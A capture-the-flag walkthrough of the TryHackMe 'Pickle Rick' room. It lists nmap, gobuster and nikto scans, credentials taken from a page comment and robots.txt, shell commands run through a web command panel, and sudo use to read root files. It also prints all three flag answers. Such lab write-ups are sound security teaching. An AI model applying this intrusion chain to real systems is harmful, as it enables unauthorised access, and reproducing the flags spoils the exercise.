+++
title = "Pickle Rick"
official = "TryHackMe"
date = 2024-09-28T16:41:31+03:00
draft = false
+++

#### Source: [TryHackMe](https://tryhackme.com/r/room/picklerick)
&nbsp;
### Objective:
***
***Obj_1 -> What is the first ingredient that Rick needs?***  
***Obj_2 -> What is the second ingredient in Rick’s potion?***  
***Obj_3 -> What is the last and final ingredient?***  
&nbsp;  
&nbsp;
### Methodology:
***
1. **nmap -sV -v {target_ip}**  

    Info:
    - 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    - 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
***
2. **browser search {target_ip}**  

    Info:
    - Inspected the page and found a comment,  
      Note to self, remember username! Username: R1ckRul3s
***
3. **gobuster dir -u http://{target_ip} -w {path_to_wordlist}**  

    Info:
    - /.hta (Status: 403)
    - /.htaccess (Status: 403)
    - /.htpasswd (Status: 403)
    - /assets (Status: 301)
      - Index of /assets
        - Parent Directory
        - bootstrap.min.css	2019-02-10 16:37 	119K	 
        - bootstrap.min.js	2019-02-10 16:37 	37K	 
        - fail.gif	2019-02-10 16:37 	49K	 
        - jquery.min.js	2019-02-10 16:37 	85K	 
        - picklerick.gif	2019-02-10 16:37 	222K	 
        - portal.jpg	2019-02-10 16:37 	50K	 
        - rickandmorty.jpeg	2019-02-10 16:37 	488K	 
    - /index.html (Status: 200)
    - /robots.txt (Status: 200)
      - Wubbalubbadubdub
    - /server-status (Status: 403)
***
4. **nikto -host {target_ip}**  

    Info:
    - Server: Apache/2.4.41 (Ubuntu)
    - Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686 
    - The anti-clickjacking X-Frame-Options header is not present.
    - No CGI Directories found (use '-C all' to force check all possible dirs)
    - "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
    - Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
    - Cookie PHPSESSID created without the httponly flag
    - /login.php: Admin login page/section found.
    - 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
***
5. **browser search {target_ip}/login.php** 

    Info:
    - Username: R1ckRul3s
    - Password: Wubbalubbadubdub
***
6. **browser search {target_ip}/portal.php**  

    Info:
    - Command Panel
      - ls
        - Sup3rS3cretPickl3Ingred.txt
        - assets
        - clue.txt
        - denied.php
        - index.html
        - login.php
        - portal.php
        - robots.txt
***
7. **browser search {target_ip}/Sup3rS3cretPickl3Ingred.txt**  

    Info:
    - ***Obj_1 -> mr. meeseek hair***
***
8. **browser search {target_ip}/clue.txt**  

    Info:
    - Look around the file system for the other ingredient.
***
9. **browser search {target_ip}/portal.php**  

    Info:
    - Command Panel
      - la -la /home/rick/
        - -rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
***
10. **browser search {target_ip}/portal.php**  

    Info:
    - sudo -l
      - (ALL) NOPASSWD: ALL
***
11. **browser search {target_ip}/portal.php**  

    Info:
    - less /home/rick/"second ingredients"
      - ***Obj_2 -> 1 jerry tear***
***
12. **browser search {target_ip}/portal.php**  

    Info:
    - sudo ls -la /root
      - -rw-------  1 root root  168 Jul 11 11:18 .bash_history
      - -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
      - -rw-r--r--  1 root root  161 Jan  2  2024 .profile
      - drwx------  2 root root 4096 Feb 10  2019 .ssh
      - -rw-------  1 root root  702 Jul 11 10:17 .viminfo
      - -rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
      - drwxr-xr-x  4 root root 4096 Jul 11 10:53 snap
***
13. **browser search {target_ip}/portal.php**  

    Info:  
    - sudo less /root/3rd.txt
      - ***Obj_3 -> fleeb juice***